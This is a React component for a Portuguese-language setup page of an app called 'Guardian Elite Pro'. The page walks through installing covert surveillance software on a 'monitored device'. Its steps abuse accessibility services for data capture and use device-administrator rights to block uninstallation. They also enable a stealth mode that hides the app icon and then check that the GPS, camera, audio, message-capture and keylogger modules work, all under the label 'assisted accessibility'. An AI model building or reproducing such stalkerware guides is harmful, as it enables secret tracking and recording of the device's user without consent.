import { Settings, CheckCircle2, ChevronRight, Shield, Smartphone, Eye } from 'lucide-react';
import { motion } from 'framer-motion';

const steps = [
  {
    number: 1,
    title: 'Acesso às Configurações do Dispositivo',
    description: 'Abra as Configurações do dispositivo monitorado e navegue até "Acessibilidade".',
    icon: Smartphone,
    detail: 'Configurações → Acessibilidade → Apps instalados',
  },
  {
    number: 2,
    title: 'Ativar Serviços de Acessibilidade',
    description: 'Localize "Guardian Elite Pro" na lista de serviços e ative a permissão.',
    icon: Eye,
    detail: 'Permita o acesso para monitoramento de atividades e captura de dados.',
  },
  {
    number: 3,
    title: 'Permissão de Administrador do Dispositivo',
    description: 'Ative o Guardian como administrador para prevenir desinstalação acidental.',
    icon: Shield,
    detail: 'Configurações → Segurança → Administradores do dispositivo → Guardian Elite Pro',
  },
  {
    number: 4,
    title: 'Desativar Otimização de Bateria',
    description: 'Desabilite a otimização de bateria para manter o serviço ativo em segundo plano.',
    icon: Settings,
    detail: 'Configurações → Bateria → Otimização → Guardian Elite Pro → Não otimizar',
  },
  {
    number: 5,
    title: 'Ocultar o Aplicativo (Opcional)',
    description: 'Ative o modo furtivo para ocultar o ícone do app na tela inicial do dispositivo.',
    icon: Eye,
    detail: 'Painel Guardian → Configurações → Modo Furtivo → Ativar',
  },
  {
    number: 6,
    title: 'Verificação Final',
    description: 'Confirme que todos os módulos estão operacionais no painel de controle.',
    icon: CheckCircle2,
    detail: 'Verifique: GPS ✓ | Câmera ✓ | Áudio ✓ | Mensagens ✓ | Keylogger ✓',
  },
];

const SetupGuidePage = () => {
  return (
    <div className="p-6 space-y-6 max-w-3xl mx-auto">
      <div className="flex items-center gap-2">
        <Settings className="h-6 w-6 text-primary" />
        <h1 className="text-2xl font-bold text-foreground">Configuração de Acessibilidade Assistida</h1>
      </div>
      <p className="text-sm text-muted-foreground">
        Siga os passos abaixo para garantir o funcionamento completo e a proteção contra remoção acidental.
      </p>

      <div className="space-y-4">
        {steps.map((step, i) => (
          <motion.div
            key={step.number}
            initial={{ opacity: 0, y: 15 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: i * 0.08 }}
            className="card-premium rounded-xl p-5"
          >
            <div className="flex items-start gap-4">
              <div className="shrink-0 h-10 w-10 rounded-full gold-gradient flex items-center justify-center text-sm font-bold text-primary-foreground">
                {step.number}
              </div>
              <div className="flex-1">
                <div className="flex items-center gap-2 mb-1">
                  <step.icon className="h-4 w-4 text-primary" />
                  <h3 className="text-sm font-semibold text-foreground">{step.title}</h3>
                </div>
                <p className="text-sm text-muted-foreground">{step.description}</p>
                <div className="mt-3 flex items-center gap-2 bg-secondary/50 px-3 py-2 rounded-lg">
                  <ChevronRight className="h-3 w-3 text-primary shrink-0" />
                  <p className="text-xs text-foreground font-mono">{step.detail}</p>
                </div>
              </div>
            </div>
          </motion.div>
        ))}
      </div>
    </div>
  );
};

export default SetupGuidePage;
